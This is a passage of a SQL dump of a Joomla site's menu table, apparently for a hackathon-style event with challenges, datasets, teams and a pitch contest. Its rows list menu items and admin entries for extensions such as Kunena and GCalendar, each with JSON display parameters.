00:00:00',0,1,'',0,'{\"aliasoptions\":\"212\",\"menu-anchor_title\":\"\",\"menu-anchor_css\":\"\",\"menu_image\":\"\",\"menu_text\":1,\"dropdown_item_subtext\":\"\",\"dropdown_customimage\":\"\",\"dropdown_customicon\":\"\",\"dropdown_customclass\":\"\",\"dropdown_columns\":\"1\",\"dropdown_distribution\":\"even\",\"dropdown_manual_distribution\":\"\",\"dropdown_dropdown_width\":\"\",\"dropdown_column_widths\":\"\",\"dropdown_children_group\":\"0\",\"dropdown_children_type\":\"menuitems\",\"dropdown_modules\":\"229\",\"dropdown_module_positions\":\"\",\"splitmenu_item_subtext\":\"\",\"splitmenu_customimage\":\"\",\"splitmenu_customicon\":\"\",\"splitmenu_customclass\":\"\"}',74,79,0,'*',0),(176,'bottommenu','Contact','contact','','contact','index.php?option=com_contact&view=contact&id=1','component',1,1,1,8,0,'0000-00-00 00:00:00',0,1,'',0,'{\"presentation_style\":\"plain\",\"show_contact_category\":\"\",\"show_contact_list\":\"\",\"show_name\":\"0\",\"show_position\":\"\",\"show_email\":\"\",\"show_street_address\":\"\",\"show_suburb\":\"\",\"show_state\":\"\",\"show_postcode\":\"\",\"show_country\":\"\",\"show_telephone\":\"\",\"show_mobile\":\"\",\"show_fax\":\"\",\"show_webpage\":\"\",\"show_misc\":\"\",\"show_image\":\"\",\"allow_vcard\":\"\",\"show_articles\":\"\",\"show_links\":\"\",\"linka_name\":\"\",\"linkb_name\":\"\",\"linkc_name\":\"\",\"linkd_name\":\"\",\"linke_name\":\"\",\"show_email_form\":\"\",\"show_email_copy\":\"0\",\"banned_email\":\"\",\"banned_subject\":\"\",\"banned_text\":\"\",\"validate_session\":\"\",\"custom_reply\":\"\",\"redirect\":\"\",\"menu-anchor_title\":\"\",\"menu-anchor_css\":\"\",\"menu_image\":\"\",\"menu_text\":1,\"page_title\":\"\",\"show_page_heading\":0,\"page_heading\":\"\",\"pageclass_sfx\":\"\",\"menu-meta_description\":\"\",\"menu-meta_keywords\":\"\",\"robots\":\"\",\"secure\":0,\"dropdown_item_subtext\":\"\",\"dropdown_customimage\":\"\",\"dropdown_customicon\":\"\",\"dropdown_customclass\":\"\",\"dropdown_columns\":\"1\",\"dropdown_distribution\":\"even\",\"dropdown_manual_distribution\":\"\",\"dropdown_dropdown_width\":\"\",\"dropdown_column_widths\":\"\",\"dropdown_children_group\":\"0\",\"dropdown_children_type\":\"menuitems\",\"dropdown_modules\":\"198\",\"dropdown_module_positions\":\"\",\"splitmenu_item_subtext\":\"\",\"splitmenu_customimage\":\"\",\"splitmenu_customicon\":\"\",\"splitmenu_customclass\":\"\"}',59,60,0,'*',0),(185,'mainmenu','Submit Resources and Datasets','submit-datasets','','get-involved/datasets/submit-datasets','index.php?option=com_b2jcontact&view=b2jcontact&bid=3','component',1,175,3,10229,0,'0000-00-00 00:00:00',0,1,'',0,'{\"component_class_sfx\":\"b2j_contact\",\"menu-anchor_title\":\"\",\"menu-anchor_css\":\"\",\"menu_image\":\"\",\"menu_text\":1,\"page_title\":\"\",\"show_page_heading\":0,\"page_heading\":\"\",\"pageclass_sfx\":\"\",\"menu-meta_description\":\"\",\"menu-meta_keywords\":\"\",\"robots\":\"\",\"secure\":0}',77,78,0,'*',0),(186,'mainmenu','Submit Challenges','submit-challenges','','get-involved/challenges/submit-challenges','index.php?option=com_b2jcontact&view=b2jcontact&bid=2','component',1,174,3,10229,0,'0000-00-00 00:00:00',0,1,'',0,'{\"component_class_sfx\":\"b2j_contact\",\"menu-anchor_title\":\"\",\"menu-anchor_css\":\"\",\"menu_image\":\"\",\"menu_text\":1,\"page_title\":\"\",\"show_page_heading\":0,\"page_heading\":\"\",\"pageclass_sfx\":\"\",\"menu-meta_description\":\"\",\"menu-meta_keywords\":\"\",\"robots\":\"\",\"secure\":0}',71,72,0,'*',0),(192,'mainmenu','Event','event','','event','','separator',0,1,1,0,0,'0000-00-00 00:00:00',0,1,'',0,'{\"menu_image\":\"\",\"menu_text\":1,\"dropdown_item_subtext\":\"\",\"dropdown_customimage\":\"\",\"dropdown_customicon\":\"\",\"dropdown_customclass\":\"\",\"dropdown_columns\":\"1\",\"dropdown_distribution\":\"even\",\"dropdown_manual_distribution\":\"\",\"dropdown_dropdown_width\":\"\",\"dropdown_column_widths\":\"\",\"dropdown_children_group\":\"0\",\"dropdown_children_type\":\"menuitems\",\"dropdown_modules\":\"198\",\"dropdown_module_positions\":\"\",\"splitmenu_item_subtext\":\"\",\"splitmenu_customimage\":\"\",\"splitmenu_customicon\":\"\",\"splitmenu_customclass\":\"\"}',65,66,0,'*',0),(193,'mainmenu','Schedule','schedule','','about/schedule','index.php?option=com_content&view=article&id=44','component',1,196,2,22,0,'0000-00-00 00:00:00',0,1,'',0,'{\"show_title\":\"\",\"link_titles\":\"\",\"show_intro\":\"\",\"show_category\":\"\",\"link_category\":\"\",\"show_parent_category\":\"\",\"link_parent_category\":\"\",\"show_author\":\"\",\"link_author\":\"\",\"show_create_date\":\"\",\"show_modify_date\":\"\",\"show_publish_date\":\"\",\"show_item_navigation\":\"\",\"show_vote\":\"\",\"show_icons\":\"0\",\"show_print_icon\":\"0\",\"show_email_icon\":\"0\",\"show_hits\":\"\",\"show_noauth\":\"\",\"urls_position\":\"\",\"menu-anchor_title\":\"\",\"menu-anchor_css\":\"\",\"menu_image\":\"\",\"menu_text\":1,\"page_title\":\"\",\"show_page_heading\":0,\"page_heading\":\"\",\"pageclass_sfx\":\"\",\"menu-meta_description\":\"\",\"menu-meta_keywords\":\"\",\"robots\":\"\",\"secure\":0,\"dropdown_item_subtext\":\"\",\"dropdown_customimage\":\"\",\"dropdown_customicon\":\"\",\"dropdown_customclass\":\"\",\"dropdown_columns\":\"1\",\"dropdown_distribution\":\"even\",\"dropdown_manual_distribution\":\"\",\"dropdown_dropdown_width\":\"\",\"dropdown_column_widths\":\"\",\"dropdown_children_group\":\"0\",\"dropdown_children_type\":\"menuitems\",\"dropdown_modules\":\"198\",\"dropdown_module_positions\":\"\",\"splitmenu_item_subtext\":\"\",\"splitmenu_customimage\":\"\",\"splitmenu_customicon\":\"\",\"splitmenu_customclass\":\"\"}',50,51,0,'*',0),(194,'mainmenu','Teams','teams','','get-involved/teams','index.php?option=com_content&view=article&id=45','component',1,197,2,22,0,'0000-00-00 00:00:00',0,1,'',0,'{\"show_title\":\"\",\"link_titles\":\"\",\"show_intro\":\"\",\"show_category\":\"\",\"link_category\":\"\",\"show_parent_category\":\"\",\"link_parent_category\":\"\",\"show_author\":\"\",\"link_author\":\"\",\"show_create_date\":\"\",\"show_modify_date\":\"\",\"show_publish_date\":\"\",\"show_item_navigation\":\"\",\"show_vote\":\"\",\"show_icons\":\"0\",\"show_print_icon\":\"0\",\"show_email_icon\":\"0\",\"show_hits\":\"\",\"show_noauth\":\"\",\"urls_position\":\"\",\"menu-anchor_title\":\"\",\"menu-anchor_css\":\"\",\"menu_image\":\"\",\"menu_text\":1,\"page_title\":\"\",\"show_page_heading\":0,\"page_heading\":\"\",\"pageclass_sfx\":\"\",\"menu-meta_description\":\"\",\"menu-meta_keywords\":\"\",\"robots\":\"\",\"secure\":0,\"dropdown_item_subtext\":\"\",\"dropdown_customimage\":\"\",\"dropdown_customicon\":\"\",\"dropdown_customclass\":\"\",\"dropdown_columns\":\"1\",\"dropdown_distribution\":\"even\",\"dropdown_manual_distribution\":\"\",\"dropdown_dropdown_width\":\"\",\"dropdown_column_widths\":\"\",\"dropdown_children_group\":\"0\",\"dropdown_children_type\":\"menuitems\",\"dropdown_modules\":\"198\",\"dropdown_module_positions\":\"\",\"splitmenu_item_subtext\":\"\",\"splitmenu_customimage\":\"\",\"splitmenu_customicon\":\"\",\"splitmenu_customclass\":\"\"}',98,105,0,'*',0),(195,'mainmenu','Create Team','create-team','','get-involved/teams/create-team','index.php?option=com_b2jcontact&view=b2jcontact&bid=4','component',1,194,3,10229,0,'0000-00-00 00:00:00',0,1,'',0,'{\"component_class_sfx\":\"b2j_contact\",\"menu-anchor_title\":\"\",\"menu-anchor_css\":\"\",\"menu_image\":\"\",\"menu_text\":1,\"page_title\":\"\",\"show_page_heading\":0,\"page_heading\":\"\",\"pageclass_sfx\":\"\",\"menu-meta_description\":\"\",\"menu-meta_keywords\":\"\",\"robots\":\"\",\"secure\":0}',99,100,0,'*',0),(196,'mainmenu','About','about','','about','','separator',1,1,1,0,0,'0000-00-00 00:00:00',0,1,'',0,'{\"menu_image\":\"\",\"menu_text\":1,\"dropdown_item_subtext\":\"\",\"dropdown_customimage\":\"\",\"dropdown_customicon\":\"\",\"dropdown_customclass\":\"\",\"dropdown_columns\":\"1\",\"dropdown_distribution\":\"even\",\"dropdown_manual_distribution\":\"\",\"dropdown_dropdown_width\":\"\",\"dropdown_column_widths\":\"\",\"dropdown_children_group\":\"0\",\"dropdown_children_type\":\"menuitems\",\"dropdown_modules\":\"212\",\"dropdown_module_positions\":\"\",\"splitmenu_item_subtext\":\"\",\"splitmenu_customimage\":\"\",\"splitmenu_customicon\":\"\",\"splitmenu_customclass\":\"\"}',49,58,0,'*',0),(197,'mainmenu','Get Involved','get-involved','','get-involved','','separator',1,1,1,0,0,'0000-00-00 00:00:00',0,1,'',0,'{\"menu_image\":\"\",\"menu_text\":1,\"dropdown_item_subtext\":\"\",\"dropdown_customimage\":\"\",\"dropdown_customicon\":\"\",\"dropdown_customclass\":\"\",\"dropdown_columns\":\"1\",\"dropdown_distribution\":\"even\",\"dropdown_manual_distribution\":\"\",\"dropdown_dropdown_width\":\"\",\"dropdown_column_widths\":\"\",\"dropdown_children_group\":\"0\",\"dropdown_children_type\":\"menuitems\",\"dropdown_modules\":\"212\",\"dropdown_module_positions\":\"\",\"splitmenu_item_subtext\":\"\",\"splitmenu_customimage\":\"\",\"splitmenu_customicon\":\"\",\"splitmenu_customclass\":\"\"}',67,106,0,'*',0),(198,'mainmenu','Resources','resources','','about/resources','index.php?option=com_content&view=article&id=42','component',1,196,2,22,0,'0000-00-00 00:00:00',0,1,'',0,'{\"show_title\":\"\",\"link_titles\":\"\",\"show_intro\":\"\",\"show_category\":\"\",\"link_category\":\"\",\"show_parent_category\":\"\",\"link_parent_category\":\"\",\"show_author\":\"\",\"link_author\":\"\",\"show_create_date\":\"\",\"show_modify_date\":\"\",\"show_publish_date\":\"\",\"show_item_navigation\":\"\",\"show_vote\":\"\",\"show_icons\":\"0\",\"show_print_icon\":\"0\",\"show_email_icon\":\"0\",\"show_hits\":\"\",\"show_noauth\":\"\",\"urls_position\":\"\",\"menu-anchor_title\":\"\",\"menu-anchor_css\":\"\",\"menu_image\":\"\",\"menu_text\":1,\"page_title\":\"\",\"show_page_heading\":0,\"page_heading\":\"\",\"pageclass_sfx\":\"\",\"menu-meta_description\":\"\",\"menu-meta_keywords\":\"\",\"robots\":\"\",\"secure\":0,\"dropdown_item_subtext\":\"\",\"dropdown_customimage\":\"\",\"dropdown_customicon\":\"\",\"dropdown_customclass\":\"\",\"dropdown_columns\":\"1\",\"dropdown_distribution\":\"even\",\"dropdown_manual_distribution\":\"\",\"dropdown_dropdown_width\":\"\",\"dropdown_column_widths\":\"\",\"dropdown_children_group\":\"0\",\"dropdown_children_type\":\"menuitems\",\"dropdown_modules\":\"212\",\"dropdown_module_positions\":\"\",\"splitmenu_item_subtext\":\"\",\"splitmenu_customimage\":\"\",\"splitmenu_customicon\":\"\",\"splitmenu_customclass\":\"\"}',54,55,0,'*',0),(199,'mainmenu','Open Source Guidelines','open-source-guidelines','','about/open-source-guidelines','index.php?option=com_content&view=article&id=43','component',1,196,2,22,0,'0000-00-00 00:00:00',0,1,'',0,'{\"show_title\":\"\",\"link_titles\":\"\",\"show_intro\":\"\",\"show_category\":\"\",\"link_category\":\"\",\"show_parent_category\":\"\",\"link_parent_category\":\"\",\"show_author\":\"\",\"link_author\":\"\",\"show_create_date\":\"\",\"show_modify_date\":\"\",\"show_publish_date\":\"\",\"show_item_navigation\":\"\",\"show_vote\":\"\",\"show_icons\":\"0\",\"show_print_icon\":\"0\",\"show_email_icon\":\"0\",\"show_hits\":\"\",\"show_noauth\":\"\",\"urls_position\":\"\",\"menu-anchor_title\":\"\",\"menu-anchor_css\":\"\",\"menu_image\":\"\",\"menu_text\":1,\"page_title\":\"\",\"show_page_heading\":0,\"page_heading\":\"\",\"pageclass_sfx\":\"\",\"menu-meta_description\":\"\",\"menu-meta_keywords\":\"\",\"robots\":\"\",\"secure\":0,\"dropdown_item_subtext\":\"\",\"dropdown_customimage\":\"\",\"dropdown_customicon\":\"\",\"dropdown_customclass\":\"\",\"dropdown_columns\":\"1\",\"dropdown_distribution\":\"even\",\"dropdown_manual_distribution\":\"\",\"dropdown_dropdown_width\":\"\",\"dropdown_column_widths\":\"\",\"dropdown_children_group\":\"0\",\"dropdown_children_type\":\"menuitems\",\"dropdown_modules\":\"207\",\"dropdown_module_positions\":\"\",\"splitmenu_item_subtext\":\"\",\"splitmenu_customimage\":\"\",\"splitmenu_customicon\":\"\",\"splitmenu_customclass\":\"\"}',56,57,0,'*',0),(200,'bottommenu','Sponsor Payment','sponsor-payment','','sponsor-payment','index.php?option=com_content&view=article&id=46','component',1,1,1,22,0,'0000-00-00 00:00:00',0,1,'',0,'{\"show_title\":\"\",\"link_titles\":\"\",\"show_intro\":\"\",\"show_category\":\"\",\"link_category\":\"\",\"show_parent_category\":\"\",\"link_parent_category\":\"\",\"show_author\":\"\",\"link_author\":\"\",\"show_create_date\":\"\",\"show_modify_date\":\"\",\"show_publish_date\":\"\",\"show_item_navigation\":\"\",\"show_vote\":\"\",\"show_icons\":\"0\",\"show_print_icon\":\"0\",\"show_email_icon\":\"0\",\"show_hits\":\"\",\"show_noauth\":\"\",\"urls_position\":\"\",\"menu-anchor_title\":\"\",\"menu-anchor_css\":\"\",\"menu_image\":\"\",\"menu_text\":1,\"page_title\":\"\",\"show_page_heading\":0,\"page_heading\":\"\",\"pageclass_sfx\":\"\",\"menu-meta_description\":\"\",\"menu-meta_keywords\":\"\",\"robots\":\"\",\"secure\":0,\"dropdown_item_subtext\":\"\",\"dropdown_customimage\":\"\",\"dropdown_customicon\":\"\",\"dropdown_customclass\":\"\",\"dropdown_columns\":\"1\",\"dropdown_distribution\":\"even\",\"dropdown_manual_distribution\":\"\",\"dropdown_dropdown_width\":\"\",\"dropdown_column_widths\":\"\",\"dropdown_children_group\":\"0\",\"dropdown_children_type\":\"menuitems\",\"dropdown_modules\":\"198\",\"dropdown_module_positions\":\"\",\"splitmenu_item_subtext\":\"\",\"splitmenu_customimage\":\"\",\"splitmenu_customicon\":\"\",\"splitmenu_customclass\":\"\"}',111,112,0,'*',0),(201,'mainmenu','Pitch Contest','pitch-contest','','about/pitch-contest','index.php?option=com_content&view=article&id=47','component',1,196,2,22,0,'0000-00-00 00:00:00',0,1,'',0,'{\"show_title\":\"\",\"link_titles\":\"\",\"show_intro\":\"\",\"show_category\":\"\",\"link_category\":\"\",\"show_parent_category\":\"\",\"link_parent_category\":\"\",\"show_author\":\"\",\"link_author\":\"\",\"show_create_date\":\"\",\"show_modify_date\":\"\",\"show_publish_date\":\"\",\"show_item_navigation\":\"\",\"show_vote\":\"\",\"show_icons\":\"0\",\"show_print_icon\":\"0\",\"show_email_icon\":\"0\",\"show_hits\":\"\",\"show_noauth\":\"\",\"urls_position\":\"\",\"menu-anchor_title\":\"\",\"menu-anchor_css\":\"\",\"menu_image\":\"\",\"menu_text\":1,\"page_title\":\"\",\"show_page_heading\":0,\"page_heading\":\"\",\"pageclass_sfx\":\"\",\"menu-meta_description\":\"\",\"menu-meta_keywords\":\"\",\"robots\":\"\",\"secure\":0,\"dropdown_item_subtext\":\"\",\"dropdown_customimage\":\"\",\"dropdown_customicon\":\"\",\"dropdown_customclass\":\"\",\"dropdown_columns\":\"1\",\"dropdown_distribution\":\"even\",\"dropdown_manual_distribution\":\"\",\"dropdown_dropdown_width\":\"\",\"dropdown_column_widths\":\"\",\"dropdown_children_group\":\"0\",\"dropdown_children_type\":\"menuitems\",\"dropdown_modules\":\"217\",\"dropdown_module_positions\":\"\",\"splitmenu_item_subtext\":\"\",\"splitmenu_customimage\":\"\",\"splitmenu_customicon\":\"\",\"splitmenu_customclass\":\"\"}',52,53,0,'*',0),(206,'main','JM_NEWSLETTER','jm-newsletter','','jm-newsletter','index.php?option=com_joomailermailchimpintegration','component',0,1,1,10108,0,'0000-00-00 00:00:00',0,1,'components/com_joomailermailchimpintegration/assets/images/mail_16.png',0,'',113,120,0,'',1),(207,'main','JM_LISTS','jm-lists','','jm-newsletter/jm-lists','index.php?option=com_joomailermailchimpintegration&view=joomailermailchimpintegrations','component',0,206,2,10108,0,'0000-00-00 00:00:00',0,1,'components/com_joomailermailchimpintegration/assets/images/lists_16.png',0,'',114,115,0,'',1),(208,'main','JM_CAMPAIGNS','jm-campaigns','','jm-newsletter/jm-campaigns','index.php?option=com_joomailermailchimpintegration&view=campaignlist','component',0,206,2,10108,0,'0000-00-00 00:00:00',0,1,'components/com_joomailermailchimpintegration/assets/images/template_16.png',0,'',116,117,0,'',1),(209,'main','JM_REPORTS','jm-reports','','jm-newsletter/jm-reports','index.php?option=com_joomailermailchimpintegration&view=campaigns','component',0,206,2,10108,0,'0000-00-00 00:00:00',0,1,'components/com_joomailermailchimpintegration/assets/images/recent_campaigns_16.png',0,'',118,119,0,'',1),(211,'mainmenu','View Challenges','view-challenges','','get-involved/challenges/view-challenges','index.php?option=com_content&view=article&id=40','component',1,174,3,22,0,'0000-00-00 00:00:00',0,1,'',0,'{\"show_title\":\"\",\"link_titles\":\"\",\"show_intro\":\"\",\"info_block_position\":\"\",\"show_category\":\"\",\"link_category\":\"\",\"show_parent_category\":\"\",\"link_parent_category\":\"\",\"show_author\":\"\",\"link_author\":\"\",\"show_create_date\":\"\",\"show_modify_date\":\"\",\"show_publish_date\":\"\",\"show_item_navigation\":\"\",\"show_vote\":\"\",\"show_tags\":\"\",\"show_icons\":\"\",\"show_print_icon\":\"0\",\"show_email_icon\":\"\",\"show_hits\":\"\",\"show_noauth\":\"\",\"urls_position\":\"\",\"menu-anchor_title\":\"\",\"menu-anchor_css\":\"\",\"menu_image\":\"\",\"menu_text\":1,\"page_title\":\"\",\"show_page_heading\":0,\"page_heading\":\"\",\"pageclass_sfx\":\"\",\"menu-meta_description\":\"\",\"menu-meta_keywords\":\"\",\"robots\":\"\",\"secure\":0}',69,70,0,'*',0),(212,'mainmenu','View Datasets','view-datasets','','get-involved/datasets/view-datasets','index.php?option=com_content&view=article&id=41','component',1,175,3,22,0,'0000-00-00 00:00:00',0,1,'',0,'{\"show_title\":\"\",\"link_titles\":\"\",\"show_intro\":\"\",\"show_category\":\"\",\"link_category\":\"\",\"show_parent_category\":\"\",\"link_parent_category\":\"\",\"show_author\":\"\",\"link_author\":\"\",\"show_create_date\":\"\",\"show_modify_date\":\"\",\"show_publish_date\":\"\",\"show_item_navigation\":\"\",\"show_vote\":\"\",\"show_icons\":\"\",\"show_print_icon\":\"\",\"show_email_icon\":\"\",\"show_hits\":\"\",\"show_noauth\":\"\",\"urls_position\":\"\",\"menu-anchor_title\":\"\",\"menu-anchor_css\":\"\",\"menu_image\":\"\",\"menu_text\":1,\"page_title\":\"\",\"show_page_heading\":0,\"page_heading\":\"\",\"pageclass_sfx\":\"\",\"menu-meta_description\":\"\",\"menu-meta_keywords\":\"\",\"robots\":\"\",\"secure\":0,\"dropdown_item_subtext\":\"\",\"dropdown_customimage\":\"\",\"dropdown_customicon\":\"\",\"dropdown_customclass\":\"\",\"dropdown_columns\":\"1\",\"dropdown_distribution\":\"even\",\"dropdown_manual_distribution\":\"\",\"dropdown_dropdown_width\":\"\",\"dropdown_column_widths\":\"\",\"dropdown_children_group\":\"0\",\"dropdown_children_type\":\"menuitems\",\"dropdown_modules\":\"229\",\"dropdown_module_positions\":\"\",\"splitmenu_item_subtext\":\"\",\"splitmenu_customimage\":\"\",\"splitmenu_customicon\":\"\",\"splitmenu_customclass\":\"\"}',75,76,0,'*',0),(249,'mainmenu','Team Forums','team-forums','','get-involved/teams/team-forums','index.php?option=com_kunena&view=category&catid=5','component',0,194,3,10061,0,'0000-00-00 00:00:00',0,1,'',0,'{\"menu-anchor_title\":\"\",\"menu-anchor_css\":\"\",\"menu_image\":\"\",\"menu_text\":1,\"page_title\":\"\",\"show_page_heading\":0,\"page_heading\":\"\",\"pageclass_sfx\":\"\",\"menu-meta_description\":\"\",\"menu-meta_keywords\":\"\",\"robots\":\"\",\"secure\":0,\"dropdown_item_subtext\":\"\",\"dropdown_customimage\":\"\",\"dropdown_customicon\":\"\",\"dropdown_customclass\":\"\",\"dropdown_columns\":\"1\",\"dropdown_distribution\":\"even\",\"dropdown_manual_distribution\":\"\",\"dropdown_dropdown_width\":\"\",\"dropdown_column_widths\":\"\",\"dropdown_children_group\":\"0\",\"dropdown_children_type\":\"menuitems\",\"dropdown_modules\":\"219\",\"dropdown_module_positions\":\"\",\"splitmenu_item_subtext\":\"\",\"splitmenu_customimage\":\"\",\"splitmenu_customicon\":\"\",\"splitmenu_customclass\":\"\"}',103,104,0,'*',0),(250,'mainmenu','View Teams','view-teams','','get-involved/teams/view-teams','index.php?option=com_content&view=article&id=45','component',1,194,3,22,0,'0000-00-00 00:00:00',0,1,'',0,'{\"show_title\":\"\",\"link_titles\":\"\",\"show_intro\":\"\",\"show_category\":\"\",\"link_category\":\"\",\"show_parent_category\":\"\",\"link_parent_category\":\"\",\"show_author\":\"\",\"link_author\":\"\",\"show_create_date\":\"\",\"show_modify_date\":\"\",\"show_publish_date\":\"\",\"show_item_navigation\":\"\",\"show_vote\":\"\",\"show_icons\":\"0\",\"show_print_icon\":\"0\",\"show_email_icon\":\"0\",\"show_hits\":\"0\",\"show_noauth\":\"\",\"urls_position\":\"\",\"menu-anchor_title\":\"\",\"menu-anchor_css\":\"\",\"menu_image\":\"\",\"menu_text\":1,\"page_title\":\"\",\"show_page_heading\":0,\"page_heading\":\"\",\"pageclass_sfx\":\"\",\"menu-meta_description\":\"\",\"menu-meta_keywords\":\"\",\"robots\":\"\",\"secure\":0,\"dropdown_item_subtext\":\"\",\"dropdown_customimage\":\"\",\"dropdown_customicon\":\"\",\"dropdown_customclass\":\"\",\"dropdown_columns\":\"1\",\"dropdown_distribution\":\"even\",\"dropdown_manual_distribution\":\"\",\"dropdown_dropdown_width\":\"\",\"dropdown_column_widths\":\"\",\"dropdown_children_group\":\"0\",\"dropdown_children_type\":\"menuitems\",\"dropdown_modules\":\"219\",\"dropdown_module_positions\":\"\",\"splitmenu_item_subtext\":\"\",\"splitmenu_customimage\":\"\",\"splitmenu_customicon\":\"\",\"splitmenu_customclass\":\"\"}',101,102,0,'*',0),(266,'main','COM_KUNENA','com-kunena','','com-kunena','index.php?option=com_kunena','component',0,1,1,10061,0,'0000-00-00 00:00:00',0,1,'components/com_kunena/media/icons/favicons/kunena-logo-white.png',0,'',121,144,0,'',1),(267,'main','COM_KUNENA_DASHBOARD','com-kunena-dashboard','','com-kunena/com-kunena-dashboard','index.php?option=com_kunena&view=cpanel','component',0,266,2,10061,0,'0000-00-00 00:00:00',0,1,'components/com_kunena/media/icons/favicons/kunena-logo-white.png',0,'',122,123,0,'',1),(268,'main','COM_KUNENA_CATEGORY_MANAGER','com-kunena-category-manager','','com-kunena/com-kunena-category-manager','index.php?option=com_kunena&view=categories','component',0,266,2,10061,0,'0000-00-00 00:00:00',0,1,'components/com_kunena/media/icons/favicons/kunena-categories.png',0,'',124,125,0,'',1),(269,'main','COM_KUNENA_USER_MANAGER','com-kunena-user-manager','','com-kunena/com-kunena-user-manager','index.php?option=com_kunena&view=users','component',0,266,2,10061,0,'0000-00-00 00:00:00',0,1,'components/com_kunena/media/icons/favicons/kunena-users.png',0,'',126,127,0,'',1),(270,'main','COM_KUNENA_FILE_MANAGER','com-kunena-file-manager','','com-kunena/com-kunena-file-manager','index.php?option=com_kunena&view=attachments','component',0,266,2,10061,0,'0000-00-00 00:00:00',0,1,'components/com_kunena/media/icons/favicons/kunena-files.png',0,'',128,129,0,'',1),(271,'main','COM_KUNENA_EMOTICON_MANAGER','com-kunena-emoticon-manager','','com-kunena/com-kunena-emoticon-manager','index.php?option=com_kunena&view=smilies','component',0,266,2,10061,0,'0000-00-00 00:00:00',0,1,'components/com_kunena/media/icons/favicons/kunena-smileys.png',0,'',130,131,0,'',1),(272,'main','COM_KUNENA_RANK_MANAGER','com-kunena-rank-manager','','com-kunena/com-kunena-rank-manager','index.php?option=com_kunena&view=ranks','component',0,266,2,10061,0,'0000-00-00 00:00:00',0,1,'components/com_kunena/media/icons/favicons/kunena-ranks.png',0,'',132,133,0,'',1),(273,'main','COM_KUNENA_TEMPLATE_MANAGER','com-kunena-template-manager','','com-kunena/com-kunena-template-manager','index.php?option=com_kunena&view=templates','component',0,266,2,10061,0,'0000-00-00 00:00:00',0,1,'components/com_kunena/media/icons/favicons/kunena-templates.png',0,'',134,135,0,'',1),(274,'main','COM_KUNENA_CONFIGURATION','com-kunena-configuration','','com-kunena/com-kunena-configuration','index.php?option=com_kunena&view=config','component',0,266,2,10061,0,'0000-00-00 00:00:00',0,1,'components/com_kunena/media/icons/favicons/kunena-prune.png',0,'',136,137,0,'',1),(275,'main','COM_KUNENA_PLUGIN_MANAGER','com-kunena-plugin-manager','','com-kunena/com-kunena-plugin-manager','index.php?option=com_kunena&view=plugins','component',0,266,2,10061,0,'0000-00-00 00:00:00',0,1,'components/com_kunena/media/icons/favicons/kunena-plugins.png',0,'',138,139,0,'',1),(276,'main','COM_KUNENA_FORUM_TOOLS','com-kunena-forum-tools','','com-kunena/com-kunena-forum-tools','index.php?option=com_kunena&view=tools','component',0,266,2,10061,0,'0000-00-00 00:00:00',0,1,'components/com_kunena/media/icons/favicons/kunena-config.png',0,'',140,141,0,'',1),(277,'main','COM_KUNENA_TRASH_MANAGER','com-kunena-trash-manager','','com-kunena/com-kunena-trash-manager','index.php?option=com_kunena&view=trash','component',0,266,2,10061,0,'0000-00-00 00:00:00',0,1,'components/com_kunena/media/icons/favicons/kunena-trash.png',0,'',142,143,0,'',1),(278,'main','COM_XMAP_TITLE','com-xmap-title','','com-xmap-title','index.php?option=com_xmap','component',0,1,1,10149,0,'0000-00-00 00:00:00',0,1,'components/com_xmap/images/xmap-favicon.png',0,'',145,146,0,'',1),(279,'main','COM_GCALENDAR','com-gcalendar','','com-gcalendar','index.php?option=com_gcalendar','component',0,1,1,10085,0,'0000-00-00 00:00:00',0,1,'class:component',0,'',147,156,0,'',1),(280,'main','COM_GCALENDAR_SUBMENU_CPANEL','com-gcalendar-submenu-cpanel','','com-gcalendar/com-gcalendar-submenu-cpanel','index.php?option=com_gcalendar&view=cpanel','component',0,279,2,10085,0,'0000-00-00 00:00:00',0,1,'class:component',0,'',148,149,0,'',1),(281,'main','COM_GCALENDAR_SUBMENU_GCALENDARS','com-gcalendar-submenu-gcalendars','','com-gcalendar/com-gcalendar-submenu-gcalendars','index.php?option=com_gcalendar&view=gcalendars','component',0,279,2,10085,0,'0000-00-00 00:00:00',0,1,'class:component',0,'',150,151,0,'',1),(282,'main','COM_GCALENDAR_SUBMENU_TOOLS','com-gcalendar-submenu-tools','','com-gcalendar/com-gcalendar-submenu-tools','index.php?option=com_gcalendar&view=tools','component',0,279,2,10085,0,'0000-00-00 00:00:00',0,1,'class:component',0,'',152,153,0,'',1),(283,'main','COM_GCALENDAR_SUBMENU_SUPPORT','com-gcalendar-submenu-support','','com-gcalendar/com-gcalendar-submenu-support','index.php?option=com_gcalendar&view=support','component',0,279,2,10085,0,'0000-00-00 00:00:00',0,1,'class:component',0,'',154,155,0,'',1),(285,'main','RokGallery','rokgallery','','rokgallery','index.php?option=com_rokgallery','component',0,1,1,10190,0,'0000-00-00 00:00:00',0,1,'components/com_rokgallery/assets/images/rokgallery_16x16.png',0,'',157,158,0,'',1),(286,'main','COM_ROKCANDY','com-rokcandy','','com-rokcandy','index.php?option=com_rokcandy','component',0,1,1,10022,0,'0000-00-00 00:00:00',0,1,'components/com_rokcandy/assets/rokcandy-icon-16.png',0,'',159,164,0,'',1),(287,'main','COM_ROKCANDY_SUBMENU_MACROS','com-rokcandy-submenu-macros','','com-rokcandy/com-rokcandy-submenu-macros','index.php?option=com_rokcandy','component',0,286,2,10022,0,'0000-00-00 00:00:00',0,1,'components/com_rokcandy/assets/rokcandy-icon-16.png',0,'',160,161,0,'',1),(288,'main','COM_ROKCANDY_SUBMENU_CATEGORIES','com-rokcandy-submenu-categories','','com-rokcandy/com-rokcandy-submenu-categories','index.php?option=com_categories&extension=com_rokcandy','component',0,286,2,10022,0,'0000-00-00 00:00:00',0,1,'components/com_rokcandy/assets/icon-16-category.png',0,'',162,163,0,'',1),(289,'main','COM_ROKBRIDGE','com-rokbridge','','com-rokbridge','index.php?option=com_rokbridge','component',0,1,1,10211,0,'0000-00-00 00:00:00',0,1,'components/com_rokbridge/assets/images/rokbridge-icon-16.png',0,'',165,166,0,'',1),(290,'main','COM_QUICKLOGOUT','com-quicklogout','','com-quicklogout','index.php?option=com_quicklogout','component',0,1,1,10071,0,'0000-00-00 00:00:00',0,1,'class:component',0,'',167,168,0,'',1),(291,'main','com_tags','Tags','','Tags','index.php?option=com_tags','component',0,1,1,29,0,'0000-00-00 00:00:00',0,1,'class:tags',0,'',47,48,0,'',1),(292,'main','com_postinstall','Post-installation messages','','Post-installation messages','index.php?option=com_postinstall','component',0,1,1,32,0,'0000-00-00 00:00:00',0,1,'class:postinstall',0,'',45,46,0,'*',1),(293,'main','JCE','jce','','jce','index.php?option=com_jce','component',0,1,1,10226,0,'0000-00-00 